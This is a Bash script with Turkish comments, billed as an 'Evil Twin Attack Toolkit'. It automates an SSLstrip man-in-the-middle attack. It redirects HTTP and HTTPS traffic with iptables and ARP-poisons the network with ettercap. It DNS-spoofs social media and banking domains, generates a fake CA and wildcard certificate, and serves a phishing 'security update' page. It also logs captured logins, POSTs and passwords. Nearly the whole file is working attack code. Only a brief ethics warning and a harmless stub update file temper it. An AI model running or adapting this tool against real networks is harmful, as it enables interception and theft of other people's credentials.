#!/bin/bash

# Evil Twin Attack - SSLstrip Setup and Configuration Script
# Bu script SSLstrip kurulumu ve yapılandırmasını yapar
# Kullanım: ./setup_sslstrip.sh [interface] [options]

# Renkli çıktı için ANSI kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${PURPLE}"
echo "═══════════════════════════════════════════════════════════════"
echo "                    EVIL TWIN ATTACK TOOLKIT                  "
echo "                   SSLstrip Setup & Config                    "
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

# Root kontrolü
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Bu script root yetkileri ile çalıştırılmalıdır!${NC}"
   echo -e "${YELLOW}[*] Kullanım: sudo $0 [interface] [options]${NC}"
   exit 1
fi

# Etik uyarı
echo -e "${RED}"
echo "⚠️  ETİK UYARI ⚠️"
echo "Bu araç yalnızca eğitim amaçlı ve kendi ağlarınızda test için kullanılmalıdır."
echo "SSLstrip kullanımı yasadışıdır ve ciddi hukuki sonuçları olabilir."
echo "Bu aracı kullanarak tüm sorumluluğu kabul etmiş olursunuz."
echo -e "${NC}"

# Parametreler
INTERFACE="$1"
SSLSTRIP_PORT="8080"
HTTP_PORT="80"
HTTPS_PORT="443"
DNS_PORT="53"
OUTPUT_DIR="/tmp/evil_twin_ssl"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="$OUTPUT_DIR/sslstrip_$TIMESTAMP.log"
CAPTURE_FILE="$OUTPUT_DIR/sslstrip_capture_$TIMESTAMP.txt"
IPTABLES_BACKUP="$OUTPUT_DIR/iptables_backup_$TIMESTAMP.txt"
GATEWAY_IP="192.168.1.1"
NETWORK_RANGE="192.168.1.0/24"
FAKE_DOMAIN_LIST="$OUTPUT_DIR/fake_domains.txt"
SSL_LOG_FILE="$OUTPUT_DIR/ssl_passwords_$TIMESTAMP.txt"
VERBOSE=false
AUTO_START=false
KILL_EXISTING=false
BACKUP_IPTABLES=true
ENABLE_DNS_SPOOF=false
ENABLE_HSTS_BYPASS=false
CUSTOM_CERTS=false
CERT_DIR="$OUTPUT_DIR/certs"
FAKE_UPDATE_SERVER=false
CAPTURE_COOKIES=true
CAPTURE_FORMS=true
CAPTURE_POSTS=true

# Global değişkenler
SSLSTRIP_PID=""
ETTERCAP_PID=""
DNSSPOOF_PID=""
ORIGINAL_IPTABLES=""
IP_FORWARD_ORIGINAL=""

# Fonksiyonlar
print_status() {
    echo -e "${BLUE}[*] $1${NC}"
    echo "$(date): [INFO] $1" >> "$LOG_FILE"
}

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
    echo "$(date): [SUCCESS] $1" >> "$LOG_FILE"
}

print_error() {
    echo -e "${RED}[!] $1${NC}"
    echo "$(date): [ERROR] $1" >> "$LOG_FILE"
}

print_warning() {
    echo -e "${YELLOW}[⚠] $1${NC}"
    echo "$(date): [WARNING] $1" >> "$LOG_FILE"
}

# Kullanım bilgisi
show_usage() {
    echo -e "${YELLOW}Kullanım:${NC}"
    echo -e "  ${CYAN}$0 [interface] [options]${NC}"
    echo
    echo -e "${YELLOW}Parametreler:${NC}"
    echo -e "  ${CYAN}interface${NC}     Ağ arayüzü (örn: eth0, wlan0)"
    echo
    echo -e "${YELLOW}Seçenekler:${NC}"
    echo -e "  ${CYAN}-p, --port <port>${NC}        SSLstrip port (varsayılan: 8080)"
    echo -e "  ${CYAN}-g, --gateway <ip>${NC}       Gateway IP (varsayılan: 192.168.1.1)"
    echo -e "  ${CYAN}-n, --network <range>${NC}    Ağ aralığı (varsayılan: 192.168.1.0/24)"
    echo -e "  ${CYAN}-o, --output <dir>${NC}       Çıktı dizini"
    echo -e "  ${CYAN}-d, --dns-spoof${NC}          DNS spoofing etkinleştir"
    echo -e "  ${CYAN}-H, --hsts-bypass${NC}        HSTS bypass etkinleştir"
    echo -e "  ${CYAN}-c, --custom-certs${NC}       Özel sertifikalar kullan"
    echo -e "  ${CYAN}-u, --fake-update${NC}        Sahte güncelleme sunucusu"
    echo -e "  ${CYAN}-a, --auto-start${NC}         Otomatik başlat"
    echo -e "  ${CYAN}-k, --kill-existing${NC}      Mevcut süreçleri sonlandır"
    echo -e "  ${CYAN}-b, --no-backup${NC}          Iptables yedekleme"
    echo -e "  ${CYAN}-v, --verbose${NC}            Detaylı çıktı"
    echo -e "  ${CYAN}-h, --help${NC}               Bu yardım mesajı"
    echo
    echo -e "${YELLOW}Örnekler:${NC}"
    echo -e "  ${CYAN}sudo $0 eth0${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0 -p 8080 -d -H${NC}"
    echo -e "  ${CYAN}sudo $0 eth0 -g 10.0.0.1 -n 10.0.0.0/24${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0 -a -k -v${NC}"
    echo
}

# Komut satırı argümanlarını işle
parse_arguments() {
    # İlk parametre pozisyonel
    if [ $# -ge 1 ]; then
        INTERFACE="$1"
        shift
    fi
    
    # Kalan parametreler seçenekler
    while [[ $# -gt 0 ]]; do
        case $1 in
            -p|--port)
                SSLSTRIP_PORT="$2"
                shift 2
                ;;
            -g|--gateway)
                GATEWAY_IP="$2"
                shift 2
                ;;
            -n|--network)
                NETWORK_RANGE="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -d|--dns-spoof)
                ENABLE_DNS_SPOOF=true
                shift
                ;;
            -H|--hsts-bypass)
                ENABLE_HSTS_BYPASS=true
                shift
                ;;
            -c|--custom-certs)
                CUSTOM_CERTS=true
                shift
                ;;
            -u|--fake-update)
                FAKE_UPDATE_SERVER=true
                shift
                ;;
            -a|--auto-start)
                AUTO_START=true
                shift
                ;;
            -k|--kill-existing)
                KILL_EXISTING=true
                shift
                ;;
            -b|--no-backup)
                BACKUP_IPTABLES=false
                shift
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            -*)
                print_error "Bilinmeyen seçenek: $1"
                show_usage
                exit 1
                ;;
            *)
                print_error "Fazla parametre: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

# Parametreleri kontrol et
validate_parameters() {
    if [ -z "$INTERFACE" ]; then
        print_error "Arayüz belirtilmedi!"
        show_usage
        exit 1
    fi
    
    # Arayüz kontrolü
    if ! ip link show "$INTERFACE" &>/dev/null; then
        print_error "Arayüz bulunamadı: $INTERFACE"
        exit 1
    fi
    
    # Port kontrolü
    if ! [[ "$SSLSTRIP_PORT" =~ ^[0-9]+$ ]] || [ "$SSLSTRIP_PORT" -lt 1 ] || [ "$SSLSTRIP_PORT" -gt 65535 ]; then
        print_error "Geçersiz port: $SSLSTRIP_PORT"
        exit 1
    fi
    
    # IP adresi kontrolü
    if ! [[ "$GATEWAY_IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        print_error "Geçersiz gateway IP: $GATEWAY_IP"
        exit 1
    fi
}

# Gerekli araçları kontrol et
check_dependencies() {
    print_status "Gerekli araçlar kontrol ediliyor..."
    
    local missing_tools=()
    
    # Temel araçlar
    local required_tools=("sslstrip" "iptables" "python" "python3")
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    # Opsiyonel araçlar
    if [ "$ENABLE_DNS_SPOOF" = true ]; then
        if ! command -v "dnsspoof" &> /dev/null && ! command -v "ettercap" &> /dev/null; then
            missing_tools+=("dnsspoof veya ettercap")
        fi
    fi
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        print_error "Eksik araçlar: ${missing_tools[*]}"
        print_status "Kurulum için: apt-get install sslstrip iptables python3 ettercap-text-only dsniff"
        exit 1
    fi
    
    print_success "Tüm gerekli araçlar mevcut"
}

# Çıktı dizinini hazırla
setup_output_directory() {
    if [ ! -d "$OUTPUT_DIR" ]; then
        mkdir -p "$OUTPUT_DIR"
        print_status "Çıktı dizini oluşturuldu: $OUTPUT_DIR"
    fi
    
    # Sertifika dizini
    if [ "$CUSTOM_CERTS" = true ]; then
        mkdir -p "$CERT_DIR"
        print_status "Sertifika dizini oluşturuldu: $CERT_DIR"
    fi
    
    # Dosya yollarını güncelle
    LOG_FILE="$OUTPUT_DIR/sslstrip_$TIMESTAMP.log"
    CAPTURE_FILE="$OUTPUT_DIR/sslstrip_capture_$TIMESTAMP.txt"
    IPTABLES_BACKUP="$OUTPUT_DIR/iptables_backup_$TIMESTAMP.txt"
    SSL_LOG_FILE="$OUTPUT_DIR/ssl_passwords_$TIMESTAMP.txt"
    FAKE_DOMAIN_LIST="$OUTPUT_DIR/fake_domains.txt"
    
    print_status "Log dosyası: $LOG_FILE"
    print_status "Yakalama dosyası: $CAPTURE_FILE"
}

# Mevcut süreçleri sonlandır
kill_existing_processes() {
    if [ "$KILL_EXISTING" = true ]; then
        print_status "Mevcut süreçler sonlandırılıyor..."
        
        # SSLstrip
        pkill -f "sslstrip" 2>/dev/null && print_status "SSLstrip sonlandırıldı"
        
        # Ettercap
        pkill -f "ettercap" 2>/dev/null && print_status "Ettercap sonlandırıldı"
        
        # DNSspoof
        pkill -f "dnsspoof" 2>/dev/null && print_status "DNSspoof sonlandırıldı"
        
        sleep 2
    fi
}

# Iptables kurallarını yedekle
backup_iptables() {
    if [ "$BACKUP_IPTABLES" = true ]; then
        print_status "Iptables kuralları yedekleniyor..."
        
        iptables-save > "$IPTABLES_BACKUP"
        
        if [ $? -eq 0 ]; then
            print_success "Iptables yedeklendi: $IPTABLES_BACKUP"
        else
            print_warning "Iptables yedeklenemedi"
        fi
    fi
}

# IP forwarding etkinleştir
enable_ip_forwarding() {
    print_status "IP forwarding etkinleştiriliyor..."
    
    # Mevcut durumu kaydet
    IP_FORWARD_ORIGINAL=$(cat /proc/sys/net/ipv4/ip_forward)
    
    # IP forwarding etkinleştir
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    if [ $(cat /proc/sys/net/ipv4/ip_forward) -eq 1 ]; then
        print_success "IP forwarding etkinleştirildi"
    else
        print_error "IP forwarding etkinleştirilemedi"
        exit 1
    fi
}

# Iptables kurallarını ayarla
setup_iptables_rules() {
    print_status "Iptables kuralları ayarlanıyor..."
    
    # HTTP trafiğini SSLstrip'e yönlendir
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "$SSLSTRIP_PORT"
    
    # HTTPS trafiğini de yönlendir (opsiyonel)
    if [ "$ENABLE_HSTS_BYPASS" = true ]; then
        iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port "$SSLSTRIP_PORT"
    fi
    
    # DNS trafiğini yönlendir (DNS spoofing için)
    if [ "$ENABLE_DNS_SPOOF" = true ]; then
        iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port "$DNS_PORT"
    fi
    
    # Masquerading etkinleştir
    iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
    
    # Forward kuralları
    iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
    iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -j ACCEPT
    
    print_success "Iptables kuralları ayarlandı"
    
    if [ "$VERBOSE" = true ]; then
        print_status "Aktif iptables kuralları:"
        iptables -t nat -L -n --line-numbers
    fi
}

# Sahte domain listesi oluştur
create_fake_domain_list() {
    print_status "Sahte domain listesi oluşturuluyor..."
    
    cat > "$FAKE_DOMAIN_LIST" << EOF
# Popüler siteler için sahte domainler
facebook.com
twitter.com
gmail.com
yahoo.com
hotmail.com
outlook.com
instagram.com
whatsapp.com
telegram.org
linkedin.com
github.com
google.com
microsoft.com
apple.com
amazon.com
netflix.com
youtube.com
spotify.com
paypal.com
ebay.com
banking.com
wells-fargo.com
chase.com
citibank.com
bank-of-america.com
EOF
    
    print_success "Sahte domain listesi oluşturuldu: $FAKE_DOMAIN_LIST"
}

# Özel sertifikalar oluştur
generate_custom_certificates() {
    if [ "$CUSTOM_CERTS" = true ]; then
        print_status "Özel sertifikalar oluşturuluyor..."
        
        # Root CA oluştur
        openssl genrsa -out "$CERT_DIR/ca.key" 2048
        openssl req -new -x509 -days 365 -key "$CERT_DIR/ca.key" -out "$CERT_DIR/ca.crt" -subj "/C=US/ST=CA/L=SF/O=EvilTwin/CN=EvilTwin-CA"
        
        # Wildcard sertifika oluştur
        openssl genrsa -out "$CERT_DIR/server.key" 2048
        openssl req -new -key "$CERT_DIR/server.key" -out "$CERT_DIR/server.csr" -subj "/C=US/ST=CA/L=SF/O=EvilTwin/CN=*.com"
        openssl x509 -req -days 365 -in "$CERT_DIR/server.csr" -CA "$CERT_DIR/ca.crt" -CAkey "$CERT_DIR/ca.key" -CAcreateserial -out "$CERT_DIR/server.crt"
        
        # PEM formatında birleştir
        cat "$CERT_DIR/server.crt" "$CERT_DIR/server.key" > "$CERT_DIR/server.pem"
        
        print_success "Özel sertifikalar oluşturuldu: $CERT_DIR"
    fi
}

# SSLstrip başlat
start_sslstrip() {
    print_status "SSLstrip başlatılıyor..."
    
    # SSLstrip komutunu oluştur
    local sslstrip_cmd="sslstrip -l $SSLSTRIP_PORT"
    
    # Yakalama dosyası
    sslstrip_cmd="$sslstrip_cmd -w $CAPTURE_FILE"
    
    # Özel sertifikalar
    if [ "$CUSTOM_CERTS" = true ] && [ -f "$CERT_DIR/server.pem" ]; then
        sslstrip_cmd="$sslstrip_cmd -c $CERT_DIR/server.pem"
    fi
    
    # HSTS bypass
    if [ "$ENABLE_HSTS_BYPASS" = true ]; then
        sslstrip_cmd="$sslstrip_cmd -s"
    fi
    
    # Favicon spoofing
    sslstrip_cmd="$sslstrip_cmd -f"
    
    # Verbose mod
    if [ "$VERBOSE" = true ]; then
        sslstrip_cmd="$sslstrip_cmd -p"
    fi
    
    print_status "SSLstrip komutu: $sslstrip_cmd"
    
    # SSLstrip'i arka planda başlat
    nohup $sslstrip_cmd > "$OUTPUT_DIR/sslstrip_output_$TIMESTAMP.txt" 2>&1 &
    SSLSTRIP_PID=$!
    
    # Başlatma kontrolü
    sleep 3
    
    if kill -0 "$SSLSTRIP_PID" 2>/dev/null; then
        print_success "SSLstrip başlatıldı (PID: $SSLSTRIP_PID)"
        echo "$SSLSTRIP_PID" > "$OUTPUT_DIR/sslstrip.pid"
    else
        print_error "SSLstrip başlatılamadı"
        exit 1
    fi
}

# DNS spoofing başlat
start_dns_spoofing() {
    if [ "$ENABLE_DNS_SPOOF" = true ]; then
        print_status "DNS spoofing başlatılıyor..."
        
        # Ettercap ile DNS spoofing
        if command -v "ettercap" &> /dev/null; then
            # DNS spoofing dosyası oluştur
            local dns_spoof_file="$OUTPUT_DIR/dns_spoof.conf"
            
            echo "# DNS Spoofing Configuration" > "$dns_spoof_file"
            
            while read -r domain; do
                [ -z "$domain" ] || [[ "$domain" =~ ^# ]] && continue
                echo "$domain A $GATEWAY_IP" >> "$dns_spoof_file"
                echo "www.$domain A $GATEWAY_IP" >> "$dns_spoof_file"
            done < "$FAKE_DOMAIN_LIST"
            
            # Ettercap başlat
            nohup ettercap -T -M arp:remote /$NETWORK_RANGE// -P dns_spoof > "$OUTPUT_DIR/ettercap_output_$TIMESTAMP.txt" 2>&1 &
            ETTERCAP_PID=$!
            
            sleep 3
            
            if kill -0 "$ETTERCAP_PID" 2>/dev/null; then
                print_success "DNS spoofing başlatıldı (PID: $ETTERCAP_PID)"
                echo "$ETTERCAP_PID" > "$OUTPUT_DIR/ettercap.pid"
            else
                print_warning "DNS spoofing başlatılamadı"
            fi
        else
            print_warning "Ettercap bulunamadı, DNS spoofing atlanıyor"
        fi
    fi
}

# Sahte güncelleme sunucusu başlat
start_fake_update_server() {
    if [ "$FAKE_UPDATE_SERVER" = true ]; then
        print_status "Sahte güncelleme sunucusu başlatılıyor..."
        
        # Python HTTP sunucusu için dizin oluştur
        local update_dir="$OUTPUT_DIR/fake_updates"
        mkdir -p "$update_dir"
        
        # Sahte güncelleme dosyaları oluştur
        cat > "$update_dir/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>System Update Required</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 50px; }
        .warning { color: red; font-weight: bold; }
        .button { background: #007cba; color: white; padding: 10px 20px; text-decoration: none; }
    </style>
</head>
<body>
    <h1>Critical Security Update Required</h1>
    <p class="warning">Your system requires an immediate security update.</p>
    <p>Click the button below to download and install the update:</p>
    <a href="/update.exe" class="button">Download Update</a>
</body>
</html>
EOF
        
        # Sahte güncelleme dosyası (zararsız)
        echo "This is a fake update file for educational purposes only." > "$update_dir/update.exe"
        
        # Python HTTP sunucusu başlat
        cd "$update_dir"
        nohup python3 -m http.server 8000 > "$OUTPUT_DIR/fake_update_server_$TIMESTAMP.txt" 2>&1 &
        local update_server_pid=$!
        cd - > /dev/null
        
        sleep 2
        
        if kill -0 "$update_server_pid" 2>/dev/null; then
            print_success "Sahte güncelleme sunucusu başlatıldı (PID: $update_server_pid)"
            echo "$update_server_pid" > "$OUTPUT_DIR/fake_update_server.pid"
        else
            print_warning "Sahte güncelleme sunucusu başlatılamadı"
        fi
    fi
}

# Yakalama izleme
start_capture_monitoring() {
    print_status "Yakalama izleme başlatılıyor..."
    
    # Yakalama dosyasını izle
    cat > "$OUTPUT_DIR/monitor_capture.sh" << EOF
#!/bin/bash

while true; do
    if [ -f "$CAPTURE_FILE" ]; then
        # Yeni yakalamalar var mı kontrol et
        if [ -s "$CAPTURE_FILE" ]; then
            echo "\$(date): Yeni yakalama tespit edildi" >> "$SSL_LOG_FILE"
            tail -n 10 "$CAPTURE_FILE" >> "$SSL_LOG_FILE"
            echo "---" >> "$SSL_LOG_FILE"
        fi
    fi
    
    sleep 30
done
EOF
    
    chmod +x "$OUTPUT_DIR/monitor_capture.sh"
    
    # İzleme scriptini arka planda başlat
    nohup "$OUTPUT_DIR/monitor_capture.sh" > /dev/null 2>&1 &
    local monitor_pid=$!
    
    echo "$monitor_pid" > "$OUTPUT_DIR/monitor.pid"
    
    print_success "Yakalama izleme başlatıldı (PID: $monitor_pid)"
}

# Durum kontrolü
check_status() {
    echo
    print_status "Sistem durumu kontrol ediliyor..."
    
    # SSLstrip durumu
    if [ -n "$SSLSTRIP_PID" ] && kill -0 "$SSLSTRIP_PID" 2>/dev/null; then
        print_success "SSLstrip çalışıyor (PID: $SSLSTRIP_PID)"
    else
        print_error "SSLstrip çalışmıyor"
    fi
    
    # Ettercap durumu
    if [ -n "$ETTERCAP_PID" ] && kill -0 "$ETTERCAP_PID" 2>/dev/null; then
        print_success "Ettercap çalışıyor (PID: $ETTERCAP_PID)"
    elif [ "$ENABLE_DNS_SPOOF" = true ]; then
        print_error "Ettercap çalışmıyor"
    fi
    
    # IP forwarding durumu
    if [ $(cat /proc/sys/net/ipv4/ip_forward) -eq 1 ]; then
        print_success "IP forwarding etkin"
    else
        print_error "IP forwarding devre dışı"
    fi
    
    # Port dinleme durumu
    if netstat -ln | grep -q ":$SSLSTRIP_PORT "; then
        print_success "Port $SSLSTRIP_PORT dinleniyor"
    else
        print_error "Port $SSLSTRIP_PORT dinlenmiyor"
    fi
    
    # Yakalama dosyası durumu
    if [ -f "$CAPTURE_FILE" ] && [ -s "$CAPTURE_FILE" ]; then
        local capture_count=$(wc -l < "$CAPTURE_FILE")
        print_success "$capture_count yakalama kaydedildi"
    else
        print_warning "Henüz yakalama yok"
    fi
    
    echo
}

# Yakalama sonuçlarını göster
show_captures() {
    echo
    print_status "Yakalama sonuçları:"
    
    if [ -f "$CAPTURE_FILE" ] && [ -s "$CAPTURE_FILE" ]; then
        echo -e "${GREEN}Yakalanan veriler:${NC}"
        echo "────────────────────────────────────────"
        
        # Son 20 satırı göster
        tail -n 20 "$CAPTURE_FILE" | while read -r line; do
            if [[ "$line" == *"POST"* ]] || [[ "$line" == *"password"* ]] || [[ "$line" == *"login"* ]]; then
                echo -e "${RED}$line${NC}"
            else
                echo "$line"
            fi
        done
        
        echo "────────────────────────────────────────"
        echo -e "${CYAN}Tam log: $CAPTURE_FILE${NC}"
    else
        print_warning "Henüz yakalama yok"
    fi
    
    echo
}

# Temizlik
cleanup() {
    print_status "Temizlik yapılıyor..."
    
    # Süreçleri sonlandır
    if [ -n "$SSLSTRIP_PID" ]; then
        kill "$SSLSTRIP_PID" 2>/dev/null
        print_status "SSLstrip sonlandırıldı"
    fi
    
    if [ -n "$ETTERCAP_PID" ]; then
        kill "$ETTERCAP_PID" 2>/dev/null
        print_status "Ettercap sonlandırıldı"
    fi
    
    # PID dosyalarından süreçleri sonlandır
    for pid_file in "$OUTPUT_DIR"/*.pid; do
        if [ -f "$pid_file" ]; then
            local pid=$(cat "$pid_file")
            kill "$pid" 2>/dev/null
            rm -f "$pid_file"
        fi
    done
    
    # Iptables kurallarını geri yükle
    if [ -f "$IPTABLES_BACKUP" ]; then
        print_status "Iptables kuralları geri yükleniyor..."
        iptables-restore < "$IPTABLES_BACKUP"
    else
        # Manuel temizlik
        iptables -t nat -F
        iptables -F
    fi
    
    # IP forwarding geri yükle
    if [ -n "$IP_FORWARD_ORIGINAL" ]; then
        echo "$IP_FORWARD_ORIGINAL" > /proc/sys/net/ipv4/ip_forward
        print_status "IP forwarding geri yüklendi"
    fi
    
    print_success "Temizlik tamamlandı"
}

# Ana fonksiyon
main() {
    echo
    print_status "SSLstrip kurulumu ve yapılandırması başlatılıyor..."
    echo
    
    # Parametreleri kontrol et
    validate_parameters
    
    # Gerekli araçları kontrol et
    check_dependencies
    
    # Çıktı dizinini hazırla
    setup_output_directory
    
    # Mevcut süreçleri sonlandır
    kill_existing_processes
    
    # Iptables yedekle
    backup_iptables
    
    # Parametreleri göster
    print_status "SSLstrip parametreleri:"
    echo -e "  ${CYAN}Arayüz:${NC} $INTERFACE"
    echo -e "  ${CYAN}SSLstrip Port:${NC} $SSLSTRIP_PORT"
    echo -e "  ${CYAN}Gateway IP:${NC} $GATEWAY_IP"
    echo -e "  ${CYAN}Ağ Aralığı:${NC} $NETWORK_RANGE"
    echo -e "  ${CYAN}DNS Spoofing:${NC} $([ "$ENABLE_DNS_SPOOF" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}HSTS Bypass:${NC} $([ "$ENABLE_HSTS_BYPASS" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Özel Sertifikalar:${NC} $([ "$CUSTOM_CERTS" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Sahte Güncelleme:${NC} $([ "$FAKE_UPDATE_SERVER" = true ] && echo "Evet" || echo "Hayır")"
    echo
    
    # Onay al (otomatik başlatma değilse)
    if [ "$AUTO_START" = false ]; then
        read -p "SSLstrip kurulumunu başlatmak istiyor musunuz? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            print_status "Kurulum iptal edildi"
            exit 0
        fi
    fi
    
    # IP forwarding etkinleştir
    enable_ip_forwarding
    
    # Iptables kurallarını ayarla
    setup_iptables_rules
    
    # Sahte domain listesi oluştur
    create_fake_domain_list
    
    # Özel sertifikalar oluştur
    generate_custom_certificates
    
    # SSLstrip başlat
    start_sslstrip
    
    # DNS spoofing başlat
    start_dns_spoofing
    
    # Sahte güncelleme sunucusu başlat
    start_fake_update_server
    
    # Yakalama izleme başlat
    start_capture_monitoring
    
    # Durum kontrolü
    check_status
    
    print_success "SSLstrip kurulumu tamamlandı!"
    
    echo
    print_status "Kullanım bilgileri:"
    echo -e "  ${CYAN}Yakalama dosyası:${NC} $CAPTURE_FILE"
    echo -e "  ${CYAN}SSL log dosyası:${NC} $SSL_LOG_FILE"
    echo -e "  ${CYAN}Durum kontrolü:${NC} $0 --status"
    echo -e "  ${CYAN}Yakalamalar:${NC} $0 --show-captures"
    echo -e "  ${CYAN}Temizlik:${NC} $0 --cleanup"
    echo
    
    # Sürekli izleme (verbose modda)
    if [ "$VERBOSE" = true ]; then
        print_status "Sürekli izleme başlatılıyor... (Ctrl+C ile çıkış)"
        
        while true; do
            sleep 30
            check_status
            show_captures
        done
    fi
}

# Özel komutlar
if [ "$1" = "--status" ]; then
    # Sadece durum kontrolü
    if [ -f "$OUTPUT_DIR/sslstrip.pid" ]; then
        SSLSTRIP_PID=$(cat "$OUTPUT_DIR/sslstrip.pid")
    fi
    if [ -f "$OUTPUT_DIR/ettercap.pid" ]; then
        ETTERCAP_PID=$(cat "$OUTPUT_DIR/ettercap.pid")
    fi
    check_status
    exit 0
elif [ "$1" = "--show-captures" ]; then
    # Sadece yakalamalar
    show_captures
    exit 0
elif [ "$1" = "--cleanup" ]; then
    # Sadece temizlik
    cleanup
    exit 0
fi

# Sinyal yakalama
trap cleanup EXIT INT TERM

# Komut satırı argümanlarını işle
parse_arguments "$@"

# Ana fonksiyonu çalıştır
main